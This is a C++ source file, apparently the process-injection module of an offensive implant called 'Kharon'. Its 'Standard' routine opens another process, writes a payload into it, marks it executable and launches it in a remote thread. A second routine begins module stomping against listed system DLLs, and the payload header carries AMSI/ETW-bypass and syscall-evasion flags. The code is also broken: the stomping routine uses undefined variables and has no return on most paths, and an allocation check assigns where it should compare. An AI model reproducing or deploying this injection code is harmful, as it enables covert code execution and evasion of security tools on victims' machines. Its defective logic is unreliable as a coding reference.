#include <Kharon.h>

auto Injection::Main(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _Inout_ INJ_OBJ* Object
) -> BOOL {
    switch ( Self->Config.Injection.TechniqueId ) {
    case INJECTION_STANDARD:
        return Self->Inj->Standard( Buffer, Size, ArgBuff, ArgSize, Object ); break;
    case INJECTION_STOMPING:
        return Self->Inj->Stomp( Buffer, Size, ArgBuff, ArgSize, Object ); break;    
    default:
        break;
    }
}

auto DECLFN Injection::Standard(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _Inout_ INJ_OBJ* Object
) -> BOOL {
    PVOID  BaseAddress = nullptr;
    PVOID  TempAddress = nullptr;
    PVOID  Destiny     = nullptr;
    PVOID  Source      = nullptr;
    ULONG  OldProt     = 0;
    PVOID  Parameter   = nullptr;
    HANDLE ThreadHandle= INVALID_HANDLE_VALUE;
    ULONG  ThreadId    = 0;
    SIZE_T FullSize    = ArgSize + Size + 16;
    HANDLE PsHandle    = INVALID_HANDLE_VALUE;
    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    if ( Object->ExecMethod == KH_METHOD_FORK ) {
        FullSize += 4 + Str::LengthA( KH_FORK_PIPE_NAME );
    }

    KhDbg("Injection::Standard called, FullSize=%llu, Size=%llu, ArgSize=%llu, PID=%lu",
           FullSize, Size, ArgSize, Object->ProcessId);

    if ( ! Object->PsHandle ) {
        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
        KhDbg("Opened process handle: %p", PsHandle);
        if ( PsHandle == INVALID_HANDLE_VALUE || ! PsHandle ) {
            KhDbg("Failed to open process %lu", Object->ProcessId);
            return FALSE;
        }
    } else {
        PsHandle = Object->PsHandle;
        KhDbg("Using existing process handle: %p", PsHandle);
    }

    TempAddress = Self->Mm->Alloc( nullptr, FullSize, MEM_COMMIT, PAGE_READWRITE );
    KhDbg("Allocated TempAddress: %p", TempAddress);
    if ( ! TempAddress ) {
        if ( PsHandle && ! Object->PsHandle ) Self->Ntdll.NtClose( PsHandle );
        KhDbg("Failed to allocate TempAddress");
        return FALSE;
    }

    auto MemAlloc = [&]( SIZE_T AllocSize ) -> PVOID {
        PVOID addr = nullptr;
        if ( Self->Config.Injection.Allocation == 0 ) {
            addr = Self->Mm->Alloc( nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle );
            KhDbg("Mm::Alloc: %p (size=%llu)", addr, AllocSize);
        } else if ( Self->Config.Injection.Allocation = 1 ) {
            addr = Self->Mm->DripAlloc( AllocSize, PAGE_READWRITE, PsHandle );
            KhDbg("DripAlloc: %p (size=%llu)", addr, AllocSize);
        } else {
            KhDbg("unknown type");
        }
        return addr;
    };

    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
        BOOL result = FALSE;
        KhDbg("Writing %llu bytes to %p", CopySize, Dst);
        if ( PsHandle == NtCurrentProcess() ) {
             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
             KhDbg("Local Mem::Copy result=%d", result);
             return result;
        } else if ( Self->Config.Injection.Writing == 0 ) {
            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
            KhDbg( "Write result=%d", result);
        } else {
            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
            KhDbg( "WriteAPC result=%d", result);
        }
        return result;
    };

    auto MemProt = [&]( PVOID Ptr, SIZE_T Size ) -> BOOL {
        BOOL  result      = FALSE;
        ULONG GranCount   = ( PAGE_ALIGN( Size ) / Self->Mm->PageGran ) + 1;
        ULONG OldProt     = 0;
        PVOID CurrentBase = Ptr;
        
        if ( Self->Config.Injection.Allocation == 1 ) {
            for ( INT32 i = 0; i < GranCount; i++ ) {
                result = Self->Mm->Protect( CurrentBase, Self->Mm->PageGran, PAGE_EXECUTE_READ, &OldProt, PsHandle );

                CurrentBase = (PVOID)( (UPTR)CurrentBase + Self->Mm->PageGran );
            }
        } else {
            result = Self->Mm->Protect( Ptr, Size, PAGE_EXECUTE_READ, &OldProt, PsHandle );
        }

        return result;
    };

    auto Cleanup = [&]( BOOL BooleanRet = FALSE, SIZE_T MemSizeToZero = 0 ) -> BOOL {
        SIZE_T DefaultSize = FullSize;

        if ( ! MemSizeToZero ) MemSizeToZero = DefaultSize;

        KhDbg("Cleanup called, success=%d, BaseAddress=%p, TempAddress=%p",
               BooleanRet, BaseAddress, TempAddress);

        if ( BooleanRet && Object->Persist ) {
            Object->BaseAddress  = BaseAddress;
            Object->ThreadHandle = ThreadHandle;
            Object->ThreadId     = ThreadId;
            KhDbg("Persisting object: Base=%p, ThreadId=%lu, Thread=%p", BaseAddress, ThreadId, ThreadHandle);
        }
        else if ( BooleanRet ) {
            KhDbg("Injection succeeded - NOT freeing BaseAddress %p (thread needs it)", BaseAddress);
            if ( PsHandle && ! Object->PsHandle ) {
                Self->Ntdll.NtClose( PsHandle );
                KhDbg("Closed process handle %p", PsHandle);
            }
        }
        else {
            if ( BaseAddress ) {
                Self->Mm->Free( BaseAddress, MemSizeToZero, MEM_RELEASE, PsHandle );
                KhDbg("Freed BaseAddress %p in remote process (cleanup after failure)", BaseAddress);
            }
            if ( PsHandle && ! Object->PsHandle ) {
                Self->Ntdll.NtClose( PsHandle );
                KhDbg("Closed process handle %p", PsHandle);
            }
        }
        
        if ( TempAddress ) {
            Self->Mm->Free( TempAddress, FullSize, MEM_RELEASE );
            KhDbg("Freed TempAddress %p (local buffer)", TempAddress);
        }
        
        return BooleanRet;
    };

    BaseAddress = MemAlloc( FullSize );
    if ( ! BaseAddress ) {
        KhDbg("[WARN] First MemAlloc failed, retrying...");
        BaseAddress = MemAlloc( FullSize );
        if ( ! BaseAddress ) {
            KhDbg("Second MemAlloc failed");
            return Cleanup();
        }
    }
    
    KhDbg("Allocated BaseAddress: %p", BaseAddress);
    
    Mem::Copy( (PBYTE)TempAddress, Buffer, Size );
    KhDbg("Copied payload buffer to TempAddress");

    PBYTE  CurrentTempPos = (PBYTE)TempAddress + Size;
    SIZE_T CurrentSize    = Size;

    if ( Object->Persist ) {
        Parameter = PTR( (UPTR)BaseAddress + Size );
    }

    if ( Object->ForkCategory || Object->ExecMethod ) {
        SIZE_T headerSize   = 16; 
        SIZE_T pipeNameSize = 0;
        CHAR*  pipeName     = nullptr;
        
        if ( Object->ExecMethod == KH_METHOD_FORK ) {
            pipeName      = KH_FORK_PIPE_NAME;
            pipeNameSize  = Str::LengthA( pipeName ); 
            headerSize   += 4 + pipeNameSize;
        }
        
        headerSize += 4 + ArgSize;

        KhDbg("header: %p", CurrentTempPos);
        
        *(ULONG*)CurrentTempPos = Object->ExecMethod;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Object->ForkCategory;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Self->Config.Syscall;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Self->Config.AmsiEtwBypass;
        CurrentTempPos += 4;
        
        if ( Object->ExecMethod == KH_METHOD_FORK ) {
            *(ULONG*)CurrentTempPos = (ULONG)pipeNameSize;
            CurrentTempPos += 4;
            
            Mem::Copy( CurrentTempPos, (PBYTE)pipeName, pipeNameSize );
            CurrentTempPos += pipeNameSize;
        }
        
        if ( ArgSize > 0 ) {
            Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
            CurrentTempPos += ArgSize;
        }
        
        KhDbg("Added injection header: ExecMethod=%lu, ForkCategory=%lu, Syscall=%lu, AmsiEtwBypass=%lu, PipeSize=%lu, ArgSize=%lu, TotalHeaderSize=%llu", 
            Object->ExecMethod, Object->ForkCategory, Self->Config.Syscall, Self->Config.AmsiEtwBypass, pipeNameSize, ArgSize, headerSize); 
        
        KhDbg("Parameter points to: %p", Parameter);
    } else if ( ArgSize > 0 ) {
        Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
        KhDbg("Copied ArgBuff (size=%llu), Parameter=%p", ArgSize, Parameter);
    }

    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
        KhDbg("Failed MemWrite to process");
        return Cleanup();
    }

    if ( ! MemProt( BaseAddress, FullSize ) ) {
        KhDbg("Failed to change protection on BaseAddress %p", BaseAddress);
        return Cleanup();
    }

    KhDbg("Changed protection on BaseAddress %p to PAGE_EXECUTE_READ", BaseAddress);

    ThreadHandle = Self->Td->Create( PsHandle, (BYTE*)BaseAddress, Parameter, 0, 0, &ThreadId );
    if ( ThreadHandle == INVALID_HANDLE_VALUE ) {
        KhDbg("Failed to create thread");
        return Cleanup();
    }
    KhDbg("Created thread %lu (handle=%p)", ThreadId, ThreadHandle);

    return Cleanup( TRUE );
}

auto DECLFN Injection::Stomp(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _Inout_ INJ_OBJ* Object
) -> BOOL {
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    HANDLE PsHandle   = INVALID_HANDLE_VALUE;

    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    if ( ! Object->PsHandle ) {
        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
        if ( PsHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }
    } else {
        PsHandle = Object->PsHandle;
    }

    WCHAR* PrefModules[] = {L"edgehtml.dll", L"mshtml.dll", L"wmp.dll", L"mfc140d.dll", L"mfc140ud.dll", L"mstscax.dll", L"onnxruntime.dll", L"twinui.pcshell.dll"};

    auto ValidTextSize = [&]( CHAR* LibPath ) -> BOOL {
        HANDLE FileHandle = Self->Krnl32.CreateFileW( 
            Self->Config.Injection.StompModule, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, 0
        );
        if ( ! FileHandle || FileHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }

        ULONG FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
        if ( ! FileSize ) {
            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
            return FALSE;
        }

        PBYTE FileBuff = (PBYTE)Self->Mm->Alloc( nullptr, FileSize, MEM_COMMIT, PAGE_READWRITE );
        if ( ! FileBuff ) {
            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
            return FALSE;
        }

        if ( ! Self->Krnl32.ReadFile( FileHandle, FileBuff, FileSize, nullptr, nullptr ) ) {
            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
            if ( FileBuff   ) Self->Mm->Free( FileBuff, FileSize, MEM_RELEASE );
            return FALSE;
        }

        IMAGE_NT_HEADERS* FileHeader = (IMAGE_NT_HEADERS*)( FileBuff + reinterpret_cast<IMAGE_DOS_HEADER*>( FileBuff )->e_lfanew );
        
        ULONG TextSize = FileHeader->OptionalHeader.SizeOfCode;
        
        if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
        if ( FileBuff   ) Self->Mm->Free( FileBuff, FileSize, MEM_RELEASE );

        if ( TextSize < Size ) return FALSE;

        return TRUE;
    };

    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
        BOOL result = FALSE;
        if ( PsHandle == NtCurrentProcess() ) {
             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
             return result;
        } else if (Self->Config.Injection.Writing == 0) {
            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
        } else {
            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
        }
        return result;
    };

    PVOID TempAddress    = Self->Mm->Alloc( nullptr, ArgSize + 16, MEM_COMMIT, PAGE_READWRITE );
    PVOID CurrentTempPos = TempAddress;

    if ( Object->ForkCategory || Object->ExecMethod ) {
        SIZE_T headerSize   = 16; 
        SIZE_T pipeNameSize = 0;
        CHAR*  pipeName     = nullptr;
        
        if ( Object->ExecMethod == KH_METHOD_FORK ) {
            pipeName      = KH_FORK_PIPE_NAME;
            pipeNameSize  = Str::LengthA( pipeName ); 
            headerSize   += 4 + pipeNameSize;
        }
        
        headerSize += 4 + ArgSize;

        KhDbg("header: %p", CurrentTempPos);
        
        *(ULONG*)CurrentTempPos = Object->ExecMethod;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Object->ForkCategory;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Self->Config.Syscall;
        CurrentTempPos += 4;
        
        *(ULONG*)CurrentTempPos = Self->Config.AmsiEtwBypass;
        CurrentTempPos += 4;
        
        if ( Object->ExecMethod == KH_METHOD_FORK ) {
            *(ULONG*)CurrentTempPos = (ULONG)pipeNameSize;
            CurrentTempPos += 4;
            
            Mem::Copy( CurrentTempPos, (PBYTE)pipeName, pipeNameSize );
            CurrentTempPos += pipeNameSize;
        }
        
        if ( ArgSize > 0 ) {
            Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
            CurrentTempPos += ArgSize;
        }
        
        KhDbg("Added injection header: ExecMethod=%lu, ForkCategory=%lu, Syscall=%lu, AmsiEtwBypass=%lu, PipeSize=%lu, ArgSize=%lu, TotalHeaderSize=%llu", 
            Object->ExecMethod, Object->ForkCategory, Self->Config.Syscall, Self->Config.AmsiEtwBypass, pipeNameSize, ArgSize, headerSize); 
        
        KhDbg("Parameter points to: %p", Parameter);
    } else if ( ArgSize > 0 ) {
        Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
        KhDbg("Copied ArgBuff (size=%llu), Parameter=%p", ArgSize, Parameter);
    }

    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
        KhDbg("Failed MemWrite to process");
        return Cleanup();
    }
}   
